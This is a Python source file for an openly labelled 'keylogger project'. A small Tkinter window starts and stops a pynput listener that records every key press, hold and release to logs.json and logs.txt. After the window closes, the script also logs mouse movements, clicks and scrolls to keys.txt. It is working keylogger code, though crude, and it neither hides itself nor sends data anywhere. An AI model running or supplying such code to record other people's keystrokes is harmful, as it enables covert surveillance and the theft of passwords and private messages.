import tkinter as tk
from tkinter import *

from pynput import keyboard,mouse
from pynput.mouse import Listener
import json


key_list = []
x = False
key_strokes =""

def writetofile(x,y):
    with open('keys.txt', 'a') as file:
        file.write('position of mouse: {0}\n'.format((x,y)))
        
def on_click(x, y, button, pressed):
    if pressed:
        with open('keys.txt', 'a') as file:
            file.write('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    with open('keys.txt', 'a') as file:
        file.write('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))       

def update_txt_file(key):
    with open('logs.txt','w+') as key_stroke:
        key_stroke.write(key)
    

def update_json_file(key_list):
    with open('logs.json','+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
       key_list.append(
           {'Pressed': f'{key}'}
           
       )
       x = True
    if x == True:
        key_list.append(
            {'Held':f'{key}'}

        )
    update_json_file(key_list)

                    
                    
def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
        
    )
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')
    

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("keylogger project")
label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("900x900")
root.mainloop()



print("[+] running keylogger successfully!\n[!]Saving the keylogs in 'logs.json'")

with Listener(on_move=writetofile,on_click=on_click, on_scroll=on_scroll) as file:
    file.join()
    

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
